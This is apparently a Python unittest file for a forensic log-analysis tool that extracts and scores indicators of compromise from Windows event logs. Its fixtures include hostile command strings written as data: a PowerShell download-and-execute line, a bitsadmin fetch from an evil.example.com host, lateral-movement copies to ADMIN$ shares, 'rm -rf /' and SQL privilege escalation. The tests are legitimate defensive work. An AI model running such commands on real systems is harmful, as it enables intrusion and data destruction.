"""Tests for validation/ground_truth.py"""
import unittest

from forcastl.validation.ground_truth import (
    fuzzy_ratio,
    extract_filename,
    _values_from_data_list,
    _values_from_data_dict,
    _parse_sql_raw_string,
    _iocs_from_text,
    extract_evidence_from_event,
    merge_evidence,
    validate_schema,
    cross_reference_metadata,
    compare_field_event_ids,
    compare_field_processes,
    compare_field_accounts,
    compare_field_commands,
    compare_field_network,
    compare_field_registry,
    PROCESS_KEYS,
    ACCOUNT_KEYS,
    COMMAND_KEYS,
    NETWORK_KEYS,
    REGISTRY_KEYS,
)


# ── fuzzy_ratio ──────────────────────────────────────────────────────────────

class TestFuzzyRatio(unittest.TestCase):
    def test_exact_match(self):
        self.assertEqual(fuzzy_ratio("powershell.exe", "powershell.exe"), 1.0)

    def test_case_insensitive_match(self):
        self.assertEqual(fuzzy_ratio("PowerShell.exe", "powershell.exe"), 1.0)

    def test_empty_strings(self):
        self.assertEqual(fuzzy_ratio("", ""), 0.0)
        self.assertEqual(fuzzy_ratio("abc", ""), 0.0)
        self.assertEqual(fuzzy_ratio("", "abc"), 0.0)

    def test_similar_strings(self):
        ratio = fuzzy_ratio("powershell.exe", "powershel.exe")
        self.assertGreater(ratio, 0.8)

    def test_completely_different(self):
        ratio = fuzzy_ratio("cmd.exe", "registry.dll")
        self.assertLess(ratio, 0.5)

    def test_whitespace_stripped(self):
        self.assertEqual(fuzzy_ratio("  abc  ", "abc"), 1.0)


# ── extract_filename ─────────────────────────────────────────────────────────

class TestExtractFilename(unittest.TestCase):
    def test_windows_path(self):
        self.assertEqual(extract_filename("C:\\Windows\\System32\\cmd.exe"), "cmd.exe")

    def test_unix_path(self):
        self.assertEqual(extract_filename("/usr/bin/python3"), "python3")

    def test_just_filename(self):
        self.assertEqual(extract_filename("lsass.exe"), "lsass.exe")

    def test_mixed_separators(self):
        self.assertEqual(extract_filename("C:\\Users/user/file.txt"), "file.txt")


# ── _values_from_data_list ───────────────────────────────────────────────────

class TestValuesFromDataList(unittest.TestCase):
    def test_extracts_matching_keys(self):
        data = [
            {"@Name": "Image", "#text": "C:\\Windows\\System32\\cmd.exe"},
            {"@Name": "CommandLine", "#text": "cmd /c whoami"},
            {"@Name": "OtherField", "#text": "ignored"},
        ]
        procs = _values_from_data_list(data, PROCESS_KEYS)
        self.assertEqual(procs, ["C:\\Windows\\System32\\cmd.exe"])

        cmds = _values_from_data_list(data, COMMAND_KEYS)
        self.assertEqual(cmds, ["cmd /c whoami"])

    def test_skips_dash_values(self):
        data = [{"@Name": "Image", "#text": "-"}]
        self.assertEqual(_values_from_data_list(data, PROCESS_KEYS), [])

    def test_skips_empty_text(self):
        data = [{"@Name": "Image", "#text": ""}]
        self.assertEqual(_values_from_data_list(data, PROCESS_KEYS), [])

    def test_non_dict_items_ignored(self):
        data = ["raw string", 123, {"@Name": "Image", "#text": "cmd.exe"}]
        result = _values_from_data_list(data, PROCESS_KEYS)
        self.assertEqual(result, ["cmd.exe"])

    def test_all_evidence_key_sets(self):
        data = [
            {"@Name": "Image", "#text": "proc.exe"},
            {"@Name": "SubjectUserName", "#text": "admin"},
            {"@Name": "CommandLine", "#text": "whoami"},
            {"@Name": "IpAddress", "#text": "10.0.0.1"},
            {"@Name": "TargetObject", "#text": "HKLM\\Software\\Key"},
        ]
        self.assertEqual(len(_values_from_data_list(data, PROCESS_KEYS)), 1)
        self.assertEqual(len(_values_from_data_list(data, ACCOUNT_KEYS)), 1)
        self.assertEqual(len(_values_from_data_list(data, COMMAND_KEYS)), 1)
        self.assertEqual(len(_values_from_data_list(data, NETWORK_KEYS)), 1)
        self.assertEqual(len(_values_from_data_list(data, REGISTRY_KEYS)), 1)


# ── _values_from_data_dict ───────────────────────────────────────────────────

class TestValuesFromDataDict(unittest.TestCase):
    def test_extracts_matching_keys(self):
        data = {
            "Image": "C:\\cmd.exe",
            "CommandLine": "whoami",
            "Unrelated": "foo",
        }
        self.assertEqual(_values_from_data_dict(data, PROCESS_KEYS), ["C:\\cmd.exe"])

    def test_skips_dash(self):
        data = {"SubjectUserName": "-"}
        self.assertEqual(_values_from_data_dict(data, ACCOUNT_KEYS), [])

    def test_skips_non_string_values(self):
        data = {"Image": 12345}
        self.assertEqual(_values_from_data_dict(data, PROCESS_KEYS), [])


# ── _parse_sql_raw_string ────────────────────────────────────────────────────

class TestParseSqlRawString(unittest.TestCase):
    def test_extracts_client_ip(self):
        raw = "some data\n[CLIENT: 192.168.1.100]\nmore data"
        result = _parse_sql_raw_string(raw)
        self.assertIn("192.168.1.100", result["network"])

    def test_skips_zero_ip(self):
        raw = "[CLIENT: 0.0.0.0]"
        result = _parse_sql_raw_string(raw)
        self.assertEqual(result["network"], [])

    def test_extracts_account_from_kv(self):
        raw = "server_principal_name:sa\ndatabase_principal_name:dbo"
        result = _parse_sql_raw_string(raw)
        self.assertIn("sa", result["accounts"])
        self.assertIn("dbo", result["accounts"])

    def test_extracts_statement(self):
        raw = "statement:ALTER SERVER ROLE sysadmin ADD MEMBER hacker"
        result = _parse_sql_raw_string(raw)
        self.assertIn("ALTER SERVER ROLE sysadmin ADD MEMBER hacker", result["commands"])

    def test_extracts_xml_address(self):
        raw = "<address>10.0.0.5</address>"
        result = _parse_sql_raw_string(raw)
        self.assertIn("10.0.0.5", result["network"])

    def test_empty_string(self):
        result = _parse_sql_raw_string("")
        self.assertEqual(result["accounts"], [])
        self.assertEqual(result["network"], [])
        self.assertEqual(result["commands"], [])


# ── _iocs_from_text (command-embedded IOC extraction) ────────────────────────

class TestIocsFromText(unittest.TestCase):
    def test_ip_in_unc_path(self):
        out = _iocs_from_text(r"copy evil.exe \\127.0.0.1\ADMIN$\evil.exe")
        self.assertIn("127.0.0.1", out["network"])

    def test_unc_host(self):
        out = _iocs_from_text(r'sc \\fs02\ create hacker binPath="virus.exe"')
        self.assertIn("fs02", out["network"])

    def test_url_and_host(self):
        out = _iocs_from_text("bitsadmin /transfer j https://evil.example.com/p.jpg c:\\p.jpg")
        self.assertIn("https://evil.example.com/p.jpg", out["network"])
        self.assertIn("evil.example.com", out["network"])

    def test_registry_path_both_notations(self):
        out = _iocs_from_text(r"reg add HKLM\SYSTEM\CurrentControlSet\Services\W32Time /v Start")
        # raw HKLM form and the expanded HKEY_LOCAL_MACHINE form are both present,
        # so GT in either notation substring-matches.
        self.assertIn(r"HKLM\SYSTEM\CurrentControlSet\Services\W32Time", out["registry"])
        self.assertIn(r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time", out["registry"])

    def test_invalid_ip_rejected(self):
        out = _iocs_from_text("version 999.999.1.1 and 0.0.0.0")
        self.assertEqual(out["network"], set())

    def test_plain_command_no_iocs(self):
        out = _iocs_from_text("cmd /c whoami")
        self.assertEqual(out["network"], set())
        self.assertEqual(out["registry"], set())


# ── extract_evidence_from_event ──────────────────────────────────────────────

class TestExtractEvidenceFromEvent(unittest.TestCase):
    def test_command_embedded_iocs_surface_into_fields(self):
        """A network/registry IOC inside a CommandLine lands in the discrete
        network/registry fields (so the hallucination detector recognizes it)."""
        event = {"Event": {
            "System": {"EventID": "4688"},
            "EventData": {"Data": [
                {"@Name": "CommandLine",
                 "#text": r"reg add HKLM\SYSTEM\CurrentControlSet\Services\W32Time && copy x \\fs02\c$\x"},
            ]},
        }}
        ev = extract_evidence_from_event(event)
        self.assertIn("fs02", ev["network"])
        self.assertTrue(any("W32Time" in r for r in ev["registry"]))

    def test_list_format_event_data(self):
        event = {
            "Event": {
                "System": {"EventID": "4688"},
                "EventData": {
                    "Data": [
                        {"@Name": "NewProcessName", "#text": "C:\\Windows\\System32\\cmd.exe"},
                        {"@Name": "SubjectUserName", "#text": "admin"},
                        {"@Name": "CommandLine", "#text": "cmd /c whoami"},
                    ]
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("4688", ev["event_ids"])
        self.assertIn("C:\\Windows\\System32\\cmd.exe", ev["processes"])
        self.assertIn("admin", ev["accounts"])
        self.assertIn("cmd /c whoami", ev["commands"])

    def test_dict_format_event_data(self):
        event = {
            "Event": {
                "System": {"EventID": "1"},
                "EventData": {
                    "Data": {
                        "Image": "C:\\powershell.exe",
                        "TargetObject": "HKLM\\Test",
                    }
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("1", ev["event_ids"])
        self.assertIn("C:\\powershell.exe", ev["processes"])
        self.assertIn("HKLM\\Test", ev["registry"])

    def test_raw_string_format(self):
        event = {
            "Event": {
                "System": {"EventID": "33205"},
                "EventData": {
                    "Data": "server_principal_name:sa\n[CLIENT: 10.0.0.1]\nstatement:DROP TABLE users"
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("33205", ev["event_ids"])
        self.assertIn("sa", ev["accounts"])
        self.assertIn("10.0.0.1", ev["network"])
        self.assertIn("DROP TABLE users", ev["commands"])

    def test_event_id_as_dict_with_text(self):
        event = {
            "Event": {
                "System": {"EventID": {"#text": "7045", "@Qualifiers": "0"}},
                "EventData": {},
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("7045", ev["event_ids"])

    def test_event_id_as_int(self):
        event = {
            "Event": {
                "System": {"EventID": 4625},
                "EventData": {},
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("4625", ev["event_ids"])

    def test_no_event_data(self):
        event = {"Event": {"System": {"EventID": "1"}}}
        ev = extract_evidence_from_event(event)
        self.assertIn("1", ev["event_ids"])
        self.assertEqual(ev["processes"], set())

    def test_direct_eventdata_keys(self):
        """EventData itself has keys (not nested in Data)."""
        event = {
            "Event": {
                "System": {"EventID": "5600"},
                "EventData": {
                    "IpAddress": "192.168.1.1",
                    "Data": [],
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("192.168.1.1", ev["network"])

    def test_service_name_extracted_as_process(self):
        event = {
            "Event": {
                "System": {"EventID": "7045"},
                "EventData": {
                    "Data": [
                        {"@Name": "ServiceName", "#text": "MaliciousSvc"},
                    ]
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("MaliciousSvc", ev["processes"])

    def test_object_dn_extracted_as_account(self):
        event = {
            "Event": {
                "System": {"EventID": "4662"},
                "EventData": {
                    "Data": [
                        {"@Name": "ObjectDN", "#text": "CN=Admin,OU=Users,DC=corp,DC=local"},
                    ]
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("CN=Admin,OU=Users,DC=corp,DC=local", ev["accounts"])

    def test_share_name_extracted_as_network(self):
        event = {
            "Event": {
                "System": {"EventID": "5140"},
                "EventData": {
                    "Data": [
                        {"@Name": "ShareName", "#text": "\\\\*\\ADMIN$"},
                    ]
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("\\\\*\\ADMIN$", ev["network"])

    def test_relative_target_name_not_a_command(self):
        """EID 5145 RelativeTargetName is a share-accessed *file path*, not a
        command — it must not pollute the commands evidence field."""
        event = {
            "Event": {
                "System": {"EventID": "5145"},
                "EventData": {
                    "Data": [
                        {"@Name": "RelativeTargetName", "#text": "svcctl"},
                    ]
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertNotIn("svcctl", ev["commands"])

    def test_payload_not_a_command(self):
        """EvtxECmd's verbose rendered-message Payload column is not a command."""
        event = {
            "Event": {
                "System": {"EventID": "4103"},
                "EventData": {
                    "Data": [
                        {"@Name": "Payload",
                         "#text": "CommandInvocation(Get-Service): \"Get-Service\""},
                    ]
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertEqual(ev["commands"], set())

    def test_scriptblock_module_source_filtered_but_real_command_kept(self):
        """4104 ScriptBlock logging dumps module source on load; filter that noise
        while keeping the actual executed command and attack payloads."""
        event = {
            "Event": {
                "System": {"EventID": "4104"},
                "EventData": {
                    "Data": [
                        {"@Name": "ScriptBlockText", "#text": "Start-Service sshd"},
                        {"@Name": "ScriptBlockText",
                         "#text": "[Parameter(ParameterSetName='ByName')] [string[]] ${Status}"},
                        {"@Name": "ScriptBlockText",
                         "#text": "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/x')"},
                    ]
                },
            }
        }
        ev = extract_evidence_from_event(event)
        self.assertIn("Start-Service sshd", ev["commands"])
        self.assertIn(
            "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/x')",
            ev["commands"],
        )
        self.assertNotIn(
            "[Parameter(ParameterSetName='ByName')] [string[]] ${Status}",
            ev["commands"],
        )


# ── merge_evidence ───────────────────────────────────────────────────────────

class TestMergeEvidence(unittest.TestCase):
    def test_merges_sets(self):
        acc = {"event_ids": {"1"}, "processes": set(), "accounts": set(),
               "commands": set(), "network": set(), "registry": set()}
        new = {"event_ids": {"2"}, "processes": {"cmd.exe"}, "accounts": set(),
               "commands": set(), "network": set(), "registry": set()}
        merge_evidence(acc, new)
        self.assertEqual(acc["event_ids"], {"1", "2"})
        self.assertEqual(acc["processes"], {"cmd.exe"})

    def test_deduplicates(self):
        acc = {"event_ids": {"1"}, "processes": set(), "accounts": set(),
               "commands": set(), "network": set(), "registry": set()}
        new = {"event_ids": {"1"}, "processes": set(), "accounts": set(),
               "commands": set(), "network": set(), "registry": set()}
        merge_evidence(acc, new)
        self.assertEqual(acc["event_ids"], {"1"})


# ── validate_schema ──────────────────────────────────────────────────────────

class TestValidateSchema(unittest.TestCase):
    def _valid_gt(self):
        return {
            "_metadata": {
                "description": "test",
                "version": "1.0",
                "total_files": 1,
            },
            "files": {
                "test.evtx": {
                    "malicious": "YES",
                    "evidence": {
                        "event_ids": ["4688"],
                        "processes": ["cmd.exe"],
                        "accounts": ["admin"],
                        "commands": ["whoami"],
                        "network": [],
                        "registry": [],
                    },
                }
            },
        }

    def test_valid_schema_passes(self):
        result = validate_schema(self._valid_gt())
        self.assertTrue(result["pass"])
        self.assertEqual(result["issues"], [])

    def test_missing_metadata_field(self):
        gt = self._valid_gt()
        del gt["_metadata"]["version"]
        result = validate_schema(gt)
        self.assertFalse(result["pass"])
        self.assertTrue(any("version" in i for i in result["issues"]))

    def test_invalid_malicious_value(self):
        gt = self._valid_gt()
        gt["files"]["test.evtx"]["malicious"] = "MAYBE"
        result = validate_schema(gt)
        self.assertFalse(result["pass"])

    def test_missing_malicious_field(self):
        gt = self._valid_gt()
        del gt["files"]["test.evtx"]["malicious"]
        result = validate_schema(gt)
        self.assertFalse(result["pass"])

    def test_missing_evidence_field(self):
        gt = self._valid_gt()
        del gt["files"]["test.evtx"]["evidence"]["network"]
        result = validate_schema(gt)
        self.assertFalse(result["pass"])

    def test_evidence_not_a_list(self):
        gt = self._valid_gt()
        gt["files"]["test.evtx"]["evidence"]["event_ids"] = "4688"
        result = validate_schema(gt)
        self.assertFalse(result["pass"])

    def test_no_evidence_dict(self):
        gt = self._valid_gt()
        del gt["files"]["test.evtx"]["evidence"]
        result = validate_schema(gt)
        self.assertFalse(result["pass"])

    def test_malicious_no_is_valid(self):
        gt = self._valid_gt()
        gt["files"]["test.evtx"]["malicious"] = "NO"
        result = validate_schema(gt)
        self.assertTrue(result["pass"])


# ── cross_reference_metadata ─────────────────────────────────────────────────

class TestCrossReferenceMetadata(unittest.TestCase):
    def test_matching_files(self):
        gt = {"files": {"a.evtx": {"evidence": {"event_ids": ["1"]}},
                        "b.evtx": {"evidence": {"event_ids": ["2"]}}}}
        meta = {"files": {"a.evtx": {"event_ids": ["1"]},
                          "b.evtx": {"event_ids": ["2"]}}}
        result = cross_reference_metadata(gt, meta)
        self.assertEqual(result["counts"]["metadata_only"], 0)
        self.assertEqual(result["counts"]["ground_truth_only"], 0)
        self.assertEqual(result["counts"]["event_id_mismatches"], 0)

    def test_metadata_only_files(self):
        gt = {"files": {"a.evtx": {"evidence": {"event_ids": ["1"]}}}}
        meta = {"files": {"a.evtx": {"event_ids": ["1"]},
                          "extra.evtx": {"event_ids": ["99"]}}}
        result = cross_reference_metadata(gt, meta)
        self.assertEqual(result["counts"]["metadata_only"], 1)
        self.assertIn("extra.evtx", result["in_metadata_not_ground_truth"])

    def test_ground_truth_only_files(self):
        gt = {"files": {"a.evtx": {"evidence": {"event_ids": ["1"]}},
                        "orphan.evtx": {"evidence": {"event_ids": ["2"]}}}}
        meta = {"files": {"a.evtx": {"event_ids": ["1"]}}}
        result = cross_reference_metadata(gt, meta)
        self.assertEqual(result["counts"]["ground_truth_only"], 1)
        self.assertIn("orphan.evtx", result["in_ground_truth_not_metadata"])

    def test_event_id_mismatch(self):
        gt = {"files": {"a.evtx": {"evidence": {"event_ids": ["1", "2"]}}}}
        meta = {"files": {"a.evtx": {"event_ids": ["1", "3"]}}}
        result = cross_reference_metadata(gt, meta)
        self.assertEqual(result["counts"]["event_id_mismatches"], 1)


# ── compare_field_event_ids ──────────────────────────────────────────────────

class TestCompareFieldEventIds(unittest.TestCase):
    def test_exact_match(self):
        result = compare_field_event_ids(["4688", "4689"], {"4688", "4689"})
        self.assertEqual(result["match_ratio"], 1.0)
        self.assertEqual(result["false_claims"], [])

    def test_false_claim(self):
        result = compare_field_event_ids(["4688", "9999"], {"4688"})
        self.assertIn("9999", result["false_claims"])
        self.assertEqual(result["match_ratio"], 0.5)

    def test_missed_by_ground_truth(self):
        result = compare_field_event_ids(["4688"], {"4688", "4689"})
        self.assertIn("4689", result["missed_by_ground_truth"])

    def test_empty_claimed_returns_1(self):
        result = compare_field_event_ids([], {"4688"})
        self.assertEqual(result["match_ratio"], 1.0)

    def test_both_empty(self):
        result = compare_field_event_ids([], set())
        self.assertEqual(result["match_ratio"], 1.0)


# ── compare_field_processes ──────────────────────────────────────────────────

class TestCompareFieldProcesses(unittest.TestCase):
    def test_exact_match_case_insensitive(self):
        result = compare_field_processes(["cmd.exe"], {"CMD.EXE"})
        self.assertEqual(result["match_ratio"], 1.0)

    def test_full_path_vs_filename(self):
        result = compare_field_processes(
            ["C:\\Windows\\System32\\cmd.exe"],
            {"C:\\Windows\\System32\\cmd.exe"}
        )
        self.assertEqual(result["match_ratio"], 1.0)

    def test_false_claim(self):
        result = compare_field_processes(["notreal.exe"], {"cmd.exe"})
        self.assertIn("notreal.exe", result["false_claims"])

    def test_empty_claimed(self):
        result = compare_field_processes([], {"cmd.exe"})
        self.assertEqual(result["match_ratio"], 1.0)

    def test_fuzzy_match(self):
        result = compare_field_processes(["powershell.exe"], {"powershel.exe"})
        self.assertEqual(result["match_ratio"], 1.0)


# ── compare_field_accounts ───────────────────────────────────────────────────

class TestCompareFieldAccounts(unittest.TestCase):
    def test_exact_match(self):
        result = compare_field_accounts(["admin"], {"admin"})
        self.assertEqual(result["match_ratio"], 1.0)

    def test_case_insensitive(self):
        result = compare_field_accounts(["ADMIN"], {"admin"})
        self.assertEqual(result["match_ratio"], 1.0)

    def test_false_claim(self):
        result = compare_field_accounts(["hacker"], {"admin"})
        self.assertIn("hacker", result["false_claims"])
        self.assertEqual(result["match_ratio"], 0.0)

    def test_fuzzy_match_domain_accounts(self):
        result = compare_field_accounts(["OFFSEC\\admmig"], {"OFFSEC\\admmig"})
        self.assertEqual(result["match_ratio"], 1.0)

    def test_empty_claimed(self):
        result = compare_field_accounts([], {"admin"})
        self.assertEqual(result["match_ratio"], 1.0)


# ── compare_field_commands ───────────────────────────────────────────────────

class TestCompareFieldCommands(unittest.TestCase):
    def test_exact_match(self):
        result = compare_field_commands(["whoami"], {"whoami"})
        self.assertEqual(result["match_ratio"], 1.0)

    def test_substring_match(self):
        result = compare_field_commands(
            ["whoami"],
            {"C:\\Windows\\system32\\cmd.exe /c whoami"}
        )
        self.assertEqual(result["match_ratio"], 1.0)

    def test_reverse_substring_match(self):
        result = compare_field_commands(
            ["cmd /c whoami /all"],
            {"whoami"}
        )
        self.assertEqual(result["match_ratio"], 1.0)

    def test_false_claim(self):
        result = compare_field_commands(["rm -rf /"], {"whoami"})
        self.assertIn("rm -rf /", result["false_claims"])

    def test_commands_truncated_at_200(self):
        long_cmd = "x" * 300
        result = compare_field_commands([long_cmd], {long_cmd})
        self.assertTrue(all(len(c) <= 200 for c in result["claimed"]))

    def test_empty_claimed(self):
        result = compare_field_commands([], {"whoami"})
        self.assertEqual(result["match_ratio"], 1.0)


# ── compare_field_network ────────────────────────────────────────────────────

class TestCompareFieldNetwork(unittest.TestCase):
    def test_exact_match(self):
        result = compare_field_network(["10.0.0.1"], {"10.0.0.1"})
        self.assertEqual(result["match_ratio"], 1.0)

    def test_false_claim(self):
        result = compare_field_network(["10.0.0.1", "10.0.0.2"], {"10.0.0.1"})
        self.assertIn("10.0.0.2", result["false_claims"])
        self.assertEqual(result["match_ratio"], 0.5)

    def test_missed(self):
        result = compare_field_network(["10.0.0.1"], {"10.0.0.1", "10.0.0.2"})
        self.assertIn("10.0.0.2", result["missed_by_ground_truth"])

    def test_empty_claimed(self):
        result = compare_field_network([], {"10.0.0.1"})
        self.assertEqual(result["match_ratio"], 1.0)


# ── compare_field_registry ───────────────────────────────────────────────────

class TestCompareFieldRegistry(unittest.TestCase):
    def test_exact_match(self):
        result = compare_field_registry(
            ["HKLM\\Software\\Test"],
            {"HKLM\\Software\\Test"}
        )
        self.assertEqual(result["match_ratio"], 1.0)

    def test_substring_match(self):
        result = compare_field_registry(
            ["HKLM\\Software"],
            {"HKLM\\Software\\Test\\SubKey"}
        )
        self.assertEqual(result["match_ratio"], 1.0)

    def test_reverse_substring_match(self):
        result = compare_field_registry(
            ["HKLM\\Software\\Test\\SubKey"],
            {"HKLM\\Software"}
        )
        self.assertEqual(result["match_ratio"], 1.0)

    def test_false_claim(self):
        result = compare_field_registry(
            ["HKLM\\Unrelated\\Path"],
            {"HKCU\\Other\\Key"}
        )
        self.assertIn("HKLM\\Unrelated\\Path", result["false_claims"])

    def test_case_insensitive(self):
        result = compare_field_registry(
            ["hklm\\software\\test"],
            {"HKLM\\SOFTWARE\\TEST"}
        )
        self.assertEqual(result["match_ratio"], 1.0)

    def test_empty_claimed(self):
        result = compare_field_registry([], {"HKLM\\Test"})
        self.assertEqual(result["match_ratio"], 1.0)


if __name__ == "__main__":
    unittest.main()
